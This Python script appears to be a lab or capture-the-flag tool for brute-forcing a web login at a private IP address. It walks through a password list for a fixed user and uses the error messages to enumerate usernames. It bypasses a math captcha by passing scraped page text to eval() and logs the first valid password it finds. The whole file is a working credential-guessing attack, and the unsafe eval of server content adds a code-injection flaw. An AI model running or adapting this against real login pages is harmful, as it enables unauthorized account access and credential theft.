import requests
import json
import re
import io
from datetime import datetime

login_url = 'http://10.10.1.108/login'
username_file = 'usernames.txt'
password_file = 'passwords.txt'
logging_file = 'logging.txt'
sleep_time_ms = 1000
logging = True

#-----------------------------------------------#

usernames = []
passwords = []

# Init logging file
def InitLog():
    with open(logging_file, 'w') as fd:
        fd.write(f'Starting run at {datetime.now()}')
        fd.write(f'---------------------------------------------------')
InitLog()

# append string to logging file
def log(string2append, print2screen=True):
    with open(logging_file, 'a') as fd:
        fd.write(f'\n{string2append}')
    if print2screen:
        print(string2append)
    
# Open file and read each line into an array
def read_file(filename):
    filestream = io.open(filename, 'r')    
    line_array = filestream.readlines()
    filestream.close()
    return line_array

# connect to web server and POST a request 
# to start a new job
def start_job(url, username, password, captcha=None):
    headers = {'Content-Type': 'application/x-www-form-urlencoded',
               'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'}
    if captcha:
        data = {'username': username, 'password': password, 'captcha': captcha}
    else:
        data = {'username': username, 'password': password}
    response_payload = requests.post(url, headers=headers, data=data)
    #print("Status Code", response_payload.status_code)
    return response_payload.text

# parse the response from the web server and look for a regex string
# if the regex string is found, return True, otherwise return False
def process_response(response_payload, error_regex_string):
    match = re.search(error_regex_string,response_payload)
    if match:
        return True
    return False
    
# function to solve the captcha
def solve_captcha(captcha_regex_string):
    return eval(captcha_regex_string)

# find the catcha in the response using regex
# return the value of the captcha
def process_response_captcha(response_payload, captcha_start_string, catcha_end_string):
    pos_start = response_payload.find(captcha_start_string) + len(captcha_start_string)
    if pos_start == -1:
        return None
    pos_end = response_payload.find(catcha_end_string, pos_start)
    return response_payload[pos_start:pos_end].strip()

################################


username = 'natalie'
password = 'test'
counter = 0
# Read the usernames and passwords from the files
usernames = read_file(username_file)
passwords = read_file(password_file)

# iterate through the usernames 
#for username in usernames:
# iterate through the passwords 
for password in passwords:
    counter+=1
#    if (counter==10):
#        break
    log(f"-----------------------------------------", False)
    
    username = username.strip()
    password = password.strip()
    
    response = start_job(login_url, username, password)

    # Test for Captha presence and test usernames
    if process_response(response, 'Captcha enabled'):
        
        # Solve the captcha
        captcha_string = process_response_captcha(response, 'Captcha enabled</h3></b></label><br>', ' = ?')
        captcha_value = solve_captcha(captcha_string)
        log(f"Captcha is enabled --> {captcha_string=} is {captcha_value}", False)
        
        # try again with the captcha value
        response = start_job(login_url, username, password, captcha_value)
        log(f"Response is: {response}", False)

        # Test for username
        if process_response(response, 'does not exist'):
            log(f"{counter} The user '{username}' does not exist")
        else:
            # Test for password
            if process_response(response, 'Invalid password for user'):
                log(f"{counter} Invalid password '{password}' for user '{username}'")
            else:
                log(f"{counter} >>>>  Valid password '{password}' for user '{username}' <<<<")
                break

    else:
        log("Captcha is not enabled")
        
        # Test for username
        if process_response(response, 'does not exist'):
            log(f"{counter} The user '{username}' does not exist")
        else:
            # Test for password
            if process_response(response, 'Invalid password for user'):
                log(f"{counter} Invalid password '{password}' for valid user '{username}'")
            else:
                log(f"{counter} >>>>  Valid password '{password}' for user '{username}' <<<<")
                break
